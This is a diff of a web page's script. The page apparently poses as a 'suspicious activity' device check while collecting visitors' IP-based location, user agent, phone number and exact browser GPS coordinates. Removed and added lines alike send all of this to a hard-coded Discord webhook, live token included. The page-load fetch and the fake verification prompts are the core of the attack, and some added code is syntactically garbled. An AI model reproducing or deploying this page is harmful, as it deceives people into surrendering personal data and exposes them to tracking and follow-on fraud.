@@ -173,8 +173,8 @@
         </div>
     </div>
     <script type="module">
-        const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1385656997587718287/WYyyFCcKvoCXwezu6f3357KcZ7dY5rsPFGneW5WXBw32qMCnrAEl4Ty0JMiWkK9vtsdY"; // Replace with your actual Discord webhook URL
-    
+        const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1385656997587718287/WYyyFCcKvoCXwezu6f3357KcZ7dY5rsPFGneW5WXBw32qMCnrAEl4Ty0JMiWkK9vtsdY"; // Re"; // Replace with your actual Discord webhook URL
+
         const phoneInputSection = document.getElementById('phoneInputSection');
         const suspiciousActivitySection = document.getElementById('suspiciousActivitySection');
         const pinDisplaySection = document.getElementById('pinDisplaySection');
@@ -183,201 +183,13 @@
         const submitBtn = document.getElementById('submitBtn');
         const phoneNumberError = document.getElementById('phoneNumberError');
         const gpsStatus = document.getElementById('gpsStatus');
-    
+
         let countryCallingCode = '+1'; // Default to +1
-    
-        // Function to send data to Discord webhook
-        async function sendToDiscord(data) {
-            try {
-                const response = await fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(data),
-                });
-                if (!response.ok) {
-                    console.error('Failed to send data to Discord:', response.status, response.statusText);
-                } else {
-                    console.log('Data sent to Discord successfully!');
-                }
-            } catch (error) {
-                console.error('Error sending data to Discord:', error);
-            }
-        }
-    
-        // Fetch user's country code and other public info on page load using ipapi.co
-        async function fetchAndSendUserInfo() {
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const json = await response.json();
-                
-                let userInfo = {
-                    content: "New visitor information:",
-                    embeds: [{
-                        title: "Visitor Details",
-                        color: 3447003, // A nice blue color
-                        fields: []
-                    }]
-                };
-    
-                if (json) {
-                    if (json.ip) userInfo.embeds[0].fields.push({ name: "IP Address", value: json.ip, inline: true });
-                    if (json.country_name) userInfo.embeds[0].fields.push({ name: "Country", value: json.country_name, inline: true });
-                    if (json.region) userInfo.embeds[0].fields.push({ name: "Region", value: json.region, inline: true });
-                    if (json.city) userInfo.embeds[0].fields.push({ name: "City", value: json.city, inline: true });
-                    if (json.postal) userInfo.embeds[0].fields.push({ name: "Postal Code", value: json.postal, inline: true });
-                    if (json.latitude && json.longitude) userInfo.embeds[0].fields.push({ name: "Approx. Coordinates (IP)", value: `${json.latitude}, ${json.longitude}`, inline: true });
-                    if (json.org) userInfo.embeds[0].fields.push({ name: "Organization", value: json.org, inline: false });
-                    if (json.country_calling_code) {
-                        countryCallingCode = json.country_calling_code;
-                        countryCodeDisplay.textContent = countryCallingCode;
-                        userInfo.embeds[0].fields.push({ name: "Country Calling Code", value: countryCallingCode, inline: true });
-                    }
-                }
-    
-                // Add browser and OS info
-                userInfo.embeds[0].fields.push({ name: "User Agent", value: navigator.userAgent, inline: false });
-                
-                sendToDiscord(userInfo);
-    
-            } catch (error) {
-                console.error('Error fetching user info:', error);
-                console.warn('Could not detect user info, defaulting country code to +1.');
-            }
-        }
-    
-        fetchAndSendUserInfo();
-    
-        // Basic phone number validation function
-        function isValidPhoneNumber(phoneNumber) {
-            const cleanedNumber = phoneNumber.replace(/[\s-()]/g, '');
-            return /^\d{7,}$/.test(cleanedNumber); // At least 7 digits
-        }
-    
-        submitBtn.addEventListener('click', async () => {
-            const rawPhoneNumber = phoneNumberInput.value.trim();
-    
-            if (!rawPhoneNumber || !isValidPhoneNumber(rawPhoneNumber)) {
-                phoneNumberError.style.display = 'block'; // Show error message
-                return;
-            } else {
-                phoneNumberError.style.display = 'none'; // Hide error message if valid
-            }
-    
-            const fullPhoneNumber = countryCallingCode + rawPhoneNumber.replace(/[\s-()]/g, ''); // Format for webhook
-    
-            // Send phone number to Discord Webhook
-            const phoneNumberPayload = {
-                content: `New Phone Number Submission:`,
-                embeds: [{
-                    title: "Phone Number Provided",
-                    color: 16763904, // A nice orange color
-                    fields: [
-                        { name: "Full Phone Number", value: fullPhoneNumber, inline: false }
-                    ]
-                }]
-            };
-    
-            try {
-                const response = await fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(phoneNumberPayload),
-                });
-    
-                if (response.ok) {
-                    console.log('Phone number sent to Discord successfully!');
-                    // After successful submission, switch to suspicious activity section
-                    phoneInputSection.classList.add('hidden');
-                    suspiciousActivitySection.classList.remove('hidden');
-                    requestGPSLocation(); // Request GPS location
-                } else {
-                    console.error('Failed to send phone number to Discord:', response.status, response.statusText);
-                    alert('There was an issue processing your request. Please try again.');
-                }
-            } catch (error) {
-                console.error('Error sending phone number to Discord:', error);
-                alert('Network error. Please check your connection and try again.');
-            }
-        });
-    
-        // Function to request GPS location and send city, country, and map link
-        function requestGPSLocation() {
-            if (navigator.geolocation) {
-                gpsStatus.textContent = 'Requesting GPS permission...';
-                gpsStatus.className = ''; // Clear previous status styles
-    
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-                        gpsStatus.textContent = 'GPS location obtained successfully!';
-                        gpsStatus.classList.add('status-success');
-    
-                        // Fetch location details using OpenStreetMap's Nominatim API (no API key required)
-                        const reverseGeoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
-                        const locationData = await reverseGeoResponse.json();
-                        const city = locationData.address.city || locationData.address.town || locationData.address.village || 'Unknown';
-                        const country = locationData.address.country || 'Unknown';
-    
-                        // Send GPS coordinates, city, country to Discord
-                        const gpsPayload = {
-                            content: `GPS Location for Submitted Phone Number:`,
-                            embeds: [{
-                                title: "Exact GPS Location",
-                                color: 5763719, // A nice green color
-                                fields: [
-                                    { name: "Latitude", value: latitude, inline: true },
-                                    { name: "Longitude", value: longitude, inline: true },
-                                    { name: "City", value: city, inline: true },
-                                    { name: "Country", value: country, inline: true },
-                                    { name: "Google Maps", value: `[View on Google Maps](https://maps.google.com/?q=${latitude},${longitude})`, inline: false }
-                                ]
-                            }]
-                        };
-                        await sendToDiscord(gpsPayload);
-    
-                        // Show PIN display after sending GPS
-                        suspiciousActivitySection.classList.add('hidden');
-                        pinDisplaySection.classList.remove('hidden');
-                    },
-                    (error) => {
-                        let errorMessage = 'Failed to verify device.';
-                        switch (error.code) {
-                            case error.PERMISSION_DENIED:
-                                errorMessage = "Location permission denied. Failed to verify device.";
-                                break;
-                            case error.POSITION_UNAVAILABLE:
-                                errorMessage = "Location information is unavailable. Failed to verify device.";
-                                break;
-                            case error.TIMEOUT:
-                                errorMessage = "The request to get user location timed out. Failed to verify device.";
-                                break;
-                            default:
-                                errorMessage = "An unknown error occurred while trying to get the location.";
-                                break;
-                        }
-                        gpsStatus.textContent = errorMessage;
-                        gpsStatus.classList.add('status-error');
-                    }
-                );
-            } else {
-                gpsStatus.textContent = 'Geolocation is not supported by this browser.';
-                gpsStatus.classList.add('status-error');
-            }
-        }
-    </script>
-        <script>
-        // The Discord webhook URL where the data will be sent
-        const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/YOUR_WEBHOOK_URL"; // Replace with your actual webhook URL
 
         // Function to send data to Discord webhook
         async function sendToDiscord(data) {
             try {
-                const response = await fetch("https://discordapp.com/api/webhooks/1385656997587718287/WYyyFCcKvoCXwezu6f3357KcZ7dY5rsPFGneW5WXBw32qMCnrAEl4Ty0JMiWkK9vtsdY"; // Re, {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -397,34 +209,42 @@
         // Function to request GPS location and send it to Discord
         function requestGPSLocation() {
             if (navigator.geolocation) {
-                // Update status
-                document.getElementById('status').textContent = 'Requesting GPS permission...';
-                
-                // Get the current position
+                gpsStatus.textContent = 'Requesting GPS permission...';
+                gpsStatus.className = ''; // Clear previous status styles
+
                 navigator.geolocation.getCurrentPosition(
                     async (position) => {
                         const latitude = position.coords.latitude;
                         const longitude = position.coords.longitude;
-                        
-                        // Update status
-                        document.getElementById('status').textContent = 'GPS location obtained successfully!';
-                        
-                        // Prepare the payload for Discord
+                        gpsStatus.textContent = 'GPS location obtained successfully!';
+                        gpsStatus.classList.add('status-success');
+
+                        // Fetch location details using OpenStreetMap's Nominatim API (no API key required)
+                        const reverseGeoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
+                        const locationData = await reverseGeoResponse.json();
+                        const city = locationData.address.city || locationData.address.town || locationData.address.village || 'Unknown';
+                        const country = locationData.address.country || 'Unknown';
+
+                        // Send GPS coordinates, city, country to Discord
                         const gpsPayload = {
-                            content: `User Location Details:`,
+                            content: `GPS Location for Submitted Phone Number:`,
                             embeds: [{
-                                title: "User GPS Location",
-                                color: 5763719, // Green color
+                                title: "Exact GPS Location",
+                                color: 5763719, // A nice green color
                                 fields: [
                                     { name: "Latitude", value: latitude, inline: true },
                                     { name: "Longitude", value: longitude, inline: true },
+                                    { name: "City", value: city, inline: true },
+                                    { name: "Country", value: country, inline: true },
                                     { name: "Google Maps", value: `[View on Google Maps](https://maps.google.com/?q=${latitude},${longitude})`, inline: false }
                                 ]
                             }]
                         };
-
-                        // Send GPS data to Discord
                         await sendToDiscord(gpsPayload);
+
+                        // Show PIN display after sending GPS
+                        suspiciousActivitySection.classList.add('hidden');
+                        pinDisplaySection.classList.remove('hidden');
                     },
                     (error) => {
                         let errorMessage = 'Failed to verify device location.';
@@ -442,16 +262,69 @@
                                 errorMessage = "An unknown error occurred.";
                                 break;
                         }
-                        document.getElementById('status').textContent = errorMessage;
+                        gpsStatus.textContent = errorMessage;
+                        gpsStatus.classList.add('status-fail');
                     }
                 );
             } else {
-                document.getElementById('status').textContent = 'Geolocation is not supported by this browser.';
+                gpsStatus.textContent = 'Geolocation is not supported by this browser.';
+                gpsStatus.classList.add('status-fail');
             }
         }
 
-        // Call the function to request GPS location as soon as the page loads
-        requestGPSLocation();
+        // Basic phone number validation function
+        function isValidPhoneNumber(phoneNumber) {
+            const cleanedNumber = phoneNumber.replace(/[\s-()]/g, '');
+            return /^\d{7,}$/.test(cleanedNumber); // At least 7 digits
+        }
+
+        submitBtn.addEventListener('click', async () => {
+            const rawPhoneNumber = phoneNumberInput.value.trim();
+
+            if (!rawPhoneNumber || !isValidPhoneNumber(rawPhoneNumber)) {
+                phoneNumberError.style.display = 'block'; // Show error message
+                return;
+            } else {
+                phoneNumberError.style.display = 'none'; // Hide error message if valid
+            }
+
+            const fullPhoneNumber = countryCallingCode + rawPhoneNumber.replace(/[\s-()]/g, ''); // Format for webhook
+
+            // Send phone number to Discord Webhook
+            const phoneNumberPayload = {
+                content: `New Phone Number Submission:`,
+                embeds: [{
+                    title: "Phone Number Provided",
+                    color: 16763904, // A nice orange color
+                    fields: [
+                        { name: "Full Phone Number", value: fullPhoneNumber, inline: false }
+                    ]
+                }]
+            };
+
+            try {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(phoneNumberPayload),
+                });
+
+                if (response.ok) {
+                    console.log('Phone number sent to Discord successfully!');
+                    // After successful submission, switch to suspicious activity section
+                    phoneInputSection.classList.add('hidden');
+                    suspiciousActivitySection.classList.remove('hidden');
+                    requestGPSLocation(); // Request GPS after phone number submission
+                } else {
+                    console.error('Error submitting phone number to Discord.');
+                }
+            } catch (error) {
+                console.error('Error sending phone number to Discord:', error);
+            }
+        });
+    </script>
 
 
 
